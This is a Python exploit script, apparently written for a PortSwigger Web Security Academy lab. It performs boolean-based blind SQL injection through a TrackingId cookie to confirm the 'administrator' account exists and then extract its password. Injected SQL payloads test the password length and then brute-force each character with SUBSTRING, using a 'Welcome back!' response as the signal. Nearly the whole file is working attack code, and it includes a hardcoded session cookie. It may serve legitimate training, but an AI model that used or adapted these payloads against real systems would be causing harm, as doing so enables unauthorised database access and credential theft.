import requests

username = "administrator"
wordlist = "0123456789abcdefghijklmnopqrstuvwxyz"

def exists_user(username: str) -> bool:
    burp0_url = "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net:443/filter?category=Pets"
    burp0_cookies = {"TrackingId": f"m4Z7dupcPN9c1dez' AND EXISTS (SELECT * FROM users WHERE username = '{username}') --", "session": "Kz5VXU0gmDk10FLMTTAqxa1uN47rn3uJ"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return "Welcome back!" in response.text

def check_password_length(index: int) -> int:
    burp0_url = "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net:443/filter?category=Pets"
    burp0_cookies = {"TrackingId": f"m4Z7dupcPN9c1dez' AND (SELECT LENGTH(password) FROM users WHERE username = '{username}') = {index} --", "session": "Kz5VXU0gmDk10FLMTTAqxa1uN47rn3uJ"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return "Welcome back!" in response.text

def is_character_in_password(character: str, index: int) -> bool:
    burp0_url = "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net:443/filter?category=Pets"
    burp0_cookies = {"TrackingId": f"m4Z7dupcPN9c1dez' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {index}, 1) = '{character}'--", "session": "Kz5VXU0gmDk10FLMTTAqxa1uN47rn3uJ"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0acc0042049a3d5080eb7637005e0054.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return "Welcome back!" in response.text

if not exists_user(username):
    print(f"User {username} does not exist")
    exit()
print(f"User {username} exists")

length = 0
for index in range(1, 40):
    print(f"Index: {index}")
    if check_password_length(index):
        length = index
        break

print(f"Password length: {length}")

password = ""
for index in range(1, length + 1):
    print(f"Index: {index}")
    for character in wordlist:
        print(f"Character: {character}")
        if is_character_in_password(character, index):
            password += character
            break
    print(f"Password: {password}")
